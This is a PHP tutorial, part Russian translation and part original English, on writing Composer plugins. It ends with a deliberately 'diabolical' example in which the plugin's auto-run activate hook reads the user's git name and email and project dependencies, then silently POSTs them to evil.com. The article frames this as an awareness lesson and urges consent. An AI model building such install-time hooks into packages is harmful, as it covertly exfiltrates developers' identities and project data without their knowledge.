>http://www.sitepoint.com/drunk-with-the-power-of-composer-plugins/
Drunk with the Power of Composer Plugins

# Опьяняющая сила Composer Plugins

`Composer` - это самый важный инструмент в наборе современного PHP-разработчика. Времена ручного управления зависимостями остались в далеком прошлом, и их место заняли такие замечательные вещи как `Semver`. Вещи, которые помогают нам спать по ночам, ведь мы можем обновлять наши зависимости не обрушивая все вокруг. 

![neanderthal smashing rocks](http://dab1nmslvvntp.cloudfront.net/wp-content/uploads/2016/03/1458601093neanderthal-785x1024.jpg)

Хоть мы и используем `Composer` довольно часто, не все знают о том, как расширить его возможности. Такая мысль даже не возникает, ведь он и так делает свою работу хорошо по-умолчанию, и кажется, что это не стоит времени или усилий, чтобы попытаться или хотя бы изучить. Даже в официальной документации [обходят стороной этот вопрос](https://getcomposer.org/doc/articles/plugins.md). Наверное, потому что никто не спрашивает...

Однако, недавние изменения сделали разработку плагинов для `Composer` намного легче. Сам же `Composer` также недавно перешел из альфа-версии в бету, пожалуй, это самый консервативный цикл релизов из когда-либо задуманных. Этот инструмент, который изменил современный PHP-мир, сделал его таким, каким мы видим его сейчас. Этот краеугольный камень профессиональной разработки PHP. Он просто перешел из альфы в бету.

Итак, сегодня я подумал, что мне бы хотелось исследовать возможности composer-плагинов, и по ходу дела создать немного свежей документации.

_Вы можете найти код этого плагина на [github.com/assertchris-tutorials/tutorial-composer-plugins](https://github.com/assertchris-tutorials/tutorial-composer-plugins)._

## Приступая к работе

Для начала, нам нужно создать репозиторий с плагином, отдельно от приложения, в котором мы будем его использовать. Плагины устанавливаются как и обычные зависимости. Давайте созданим новую папку и положим туда `composer.json` файл:

```
{
    "type": "composer-plugin",
    "name": "sitepoint/plugin",
    "require": {
        "composer-plugin-api": "^1.0"
    }
}
```

Каждая из этих строчек важна! Мы присваиваем этому плагину тип `composer-plugin` для того, чтобы иметь доступ к хукам жизненного цикла `Composer`, которые мы будем использовать.

Мы даем имя плагину, чтобы наше приложение могло добавить его в зависимости. Вы можете использовать все остальные переменные по вашему усмотрению, но запомните как вы назвали плагин, это нам понадобится позже.

Также мы должны проставить зависимость с `composer-plugin-api`. Указанная версия важна, потому что наш плагин будет рассматриваться как совместимый с определенной версией API плагинов, что в свою очередь влияет на такие вещи, как, например, метод подписей.

Далее нам необходимо указать класс для автозагрузки плагина:

```
"autoload": {
    "psr-4": {
        "HabraHabr\\": "src"
    }
},
"extra": {
    "class": "HabraHabr\\Plugin"
}
```

Создаем папку `src` с файлом `Plugin.php`. Вот код, который отработает на первом хуке в жизненном цикле `Composer`:

```php
namespace HabraHabr;

use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;

class Plugin implements PluginInterface
{
    public function activate(Composer $composer, IOInterface $io)
    {
        print "hello world";
    }
}
```

`PluginInterface` описывает наличие публичного метода `activate`, который вызывается после загрузки плагина. Давайте убедимся, что наш плагин работае. Перейдем в наше приложение и создадим для него `composer.json`:

```
{
    "name": "habrahabr/app",
    "require": {
        "habrahabr/plugin": "*"
    },
    "repositories": [
        {
            "type": "path",
            "url": "../habrahabr-plugin"
        }
    ],
    "minimum-stability": "dev",
    "prefer-stable": true
}
```

Это значительно проще, чем раньше и больше похоже на то, как люди будут использовать ваш плагин. Лучшим решением было бы выпустить стабильные версии вашего плагина через Packagist, но пока вы разрабатываете и так нормально. Конфиг сообщает `Composer`'у что нужно запросить любые имеющиеся версии `habrahabr/plugin` и указывает источник для зависимости.

Путь к репозиторию относительный, поэтому Composer автоматически сделает symlink и заботится об этом вам не придется. Раз уж мы завязываемся на нестабильной зависимости, то давайте укажем минимально-требуемый уровень как `dev`.

_В подобных ситуациях все же будет предпочтительней завязываться на стабильных версиях библиотек там, где это возможно..._

Теперь при запуске `composer install` из папки приложения вы увидите сообщение `hello world`! И все это без какого либо размещения кода на [на github](https://github.com) или [Packagist](https://packagist.org).

_Я рекомендую использовать команду `rm -rf vendor composer.lock; composer install` во время разработки. Особенно, когда вы начнете работать с папками для установки!_

## Исследуем возможности

_ Также хорошей идеей будет поставить в зависимости `composer/composer`, это упростит нам работу с интерфейсами и классами, которые в будущем нам понадобятся._

Большую часть того, что вы узнаете о плагинах, вы можете найти глядя на исходные коды `Composer`. В качестве альтернативы вы можете воспользоваться дебаггером и проверить весь ход исполнения, начиная с метода `activate`. Также, если вы используете IDE, например [PHPStorm](https://www.jetbrains.com/phpstorm), наличие исходников облегчит изучение и поможет легко перемещаться между вашим кодом и кодом менеджера зависимостей.

Например, мы можем проинспектировать `$composer->getPackage()`, чтобы увидеть для чего нужна та или иная переменная в файле `composer.json`. Мы можем использовать `$io->ask("...")`, чтобы задавать вопросы во время процесса установки.

## Putting These to Use

Let’s build something practical, though perhaps a little diabolical. Let’s make our plugin track users and the dependencies they require. We begin by finding their Git username and email:

```php
public function activate(Composer $composer, IOInterface $io)
{
    exec("git config --global user.name", $name);
    exec("git config --global user.email", $email);

    $payload = [];

    if (count($name) > 0) {
        $payload["name"] = $name[0];
    }

    if (count($email) > 0) {
        $payload["email"] = $email[0];
    }
}
```

Git user names and email addresses are usually stored in global config, which means running `git config --<span class="token keyword">global</span> user.name` from terminal will return them. We can take that a step further, by running them through `exec`, and inspecting the results.

Next, let’s track the name of the application (if one is defined) as well as the dependencies and their versions. We can do the same for the development dependencies, so let’s create a method for both:

```php
private function addDependencies($type, array $dependencies, array $payload)
{
    $payload = array_slice($payload, 0);

    if (count($dependencies) > 0) {
        $payload[$type] = [];
    }

    foreach ($dependencies as $dependency) {
        $name = $dependency->getTarget();
        $version = $dependency->getPrettyConstraint();

        $payload[$type][$name] = $version;
    }

    return $payload;
}
```

We get the name and version constraint for each dependency, and add them to the `<span class="token variable">$payload</span>` array. Calling `array_slice` on the payload array ensures no side-effects for this method, so it can be called any number of times with exactly the same results.

_This is often referred to as a pure function, or an example of immutable variable usage._

Then we call this method with the dependency arrays:

```php
public function activate(Composer $composer, IOInterface $io)
{
    // ...get user details

    $app = $composer->getPackage()->getName();

    if ($app) {
        $payload["app"] = $app;
    }

    $payload = $this->addDependencies(
        "requires",
        $composer->getPackage()->getRequires(),
        $payload
    );

    $payload = $this->addDependencies(
        "dev-requires",
        $composer->getPackage()->getDevRequires(),
        $payload
    );
}
```

Finally, we can send this data somewhere:

```php
public function activate(Composer $composer, IOInterface $io)
{
    // ...get user details

    // ...get project details

    $context = stream_context_create([
        "http" => [
            "method" => "POST",
            "timeout" => 0.5,
            "content" => http_build_query($payload),
        ],
    ]);

    @file_get_contents("https://evil.com", false, $context);
}
```

We could use [Guzzle](http://docs.guzzlephp.org) for this, but `file_get_contents` works just as well. We send a `<span class="token constant">POST</span>` request to `https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>evil.com`, with a serialized payload.

## Be Good

I don’t want this to seem like a recommendation for covert user data gathering. But perhaps it’s useful to know just how much data someone _could_ gather, just by requiring a well-crafted Composer plugin.

You could use the `composer install --no-plugins` option, but many frameworks and content management systems depend on plugins to set themselves up correctly.

A few additional warnings:

1.  If you’re going to use `exec`, filter and validate any data that isn’t hard-coded. Otherwise you’re creating attack vectors for your code.
2.  If you’re sending data anywhere, send it over HTTPS. Otherwise other malicious people can reap the benefits of your malicious data gathering.
3.  Don’t track user data without consent. It’s possible to ask before you take the data, so do that every time! Something like `IOInterface::ask("...")` is just what you need…

Did this article help you? Perhaps you’ve got an idea for a plugin; like a custom installer plugin or a plugin that downloads offline documentation for popular projects. Let us know in the comments below…


# composer, OOPHP, packagist, PHP, php package, plugin, plugin plugin-development